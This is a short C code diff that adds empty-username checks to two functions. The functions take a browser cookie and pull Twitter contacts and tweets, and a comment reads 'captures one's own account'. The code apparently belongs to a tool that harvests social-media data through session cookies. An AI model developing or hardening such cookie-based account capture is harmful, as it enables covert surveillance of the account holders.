@@ -183,6 +183,10 @@ DWORD HandleTwitterContacts(char *cookie)
 	}
 	*parser2=0;
 	_snprintf_s(user, sizeof(user), _TRUNCATE, "%s", parser1);
+	if (strlen(user) == 0) {
+		SAFE_FREE(r_buffer);
+		return SOCIAL_REQUEST_BAD_COOKIE;
+	}
 
 	// Cattura il proprio account
 	parser1 = parser2 + 1;
@@ -340,5 +344,8 @@ DWORD HandleTwitterTweets(char *cookie)
 	_snprintf_s(user, sizeof(user), _TRUNCATE, "%s", parser1);
 	SAFE_FREE(r_buffer);
 
+	if (strlen(user) == 0) 
+		return SOCIAL_REQUEST_BAD_COOKIE;
+	
 	return ParseTweet(user, cookie);
 }
